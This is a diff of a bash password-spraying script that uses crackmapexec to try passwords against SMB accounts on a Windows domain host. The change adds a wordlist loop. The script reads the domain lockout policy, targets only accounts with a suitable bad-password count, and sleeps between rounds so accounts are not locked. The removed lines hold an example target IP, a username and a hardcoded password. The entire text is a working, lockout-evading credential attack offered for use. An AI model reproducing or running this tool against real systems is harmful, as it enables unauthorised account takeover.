@@ -4,7 +4,7 @@
 #author		 :whoamins
 #date            :02.08.2022
 #version         :0.1
-#usage		 :./spray.sh ip username password
+#usage		 :./spray.sh ip username password wordlist
 #notes           :Install crackmapexec to use this script.
 #bash_version    :5.1.16(1)-release
 #==============================================================================
@@ -12,6 +12,7 @@
 ip=""
 username=""
 password=""
+wordlist=""
 account_lockout_threshold=0
 
 check_for_crackmapexec() {
@@ -31,7 +32,7 @@ get_users_with_suitable_badpwdtime() {
 }
 
 start_brute_with_suitable_users() {
-	crackmapexec smb $ip -u /tmp/all_suitable_users.txt -p P@ssw0rd123 --continue-on-success | tee /tmp/spray_result.txt
+	crackmapexec smb $ip -u /tmp/all_suitable_users.txt -p $current_password --continue-on-success | tee /tmp/spray_result.txt
 	cat /tmp/spray_result.txt | grep "+" > /tmp/success_spray.txt
 }
 
@@ -47,25 +48,28 @@ get_domain_password_policy() {
 }
 
 get_args() {
-	# if (($# != 3)); then
- #    	echo "./spray.sh 10.11.1.195 ilsaf.nabiullin P@ssw0rd"
-	# fi
     ip=${commandline_args[0]};
     username=${commandline_args[1]}
     password=${commandline_args[2]}
+    wordlist=${commandline_args[3]}
 }
 
 start() {
-	get_args $1 $2 $3
+	get_args $1 $2 $3 $4
 	check_for_crackmapexec
-	
+	counter=1
+
 	while true
 	do
+		n=$counter'p'
+		current_password=$(sed -n "$n" < $wordlist)
 		get_domain_password_policy
 		get_all_users
 		get_users_with_suitable_badpwdtime
 		start_brute_with_suitable_users
+		counter=$((counter+1))
 		sleep $reset_account_lockout_counter
+		# A zachem zhdat' sbrosa, kogda est' ewe popitki
 	done
 }
 
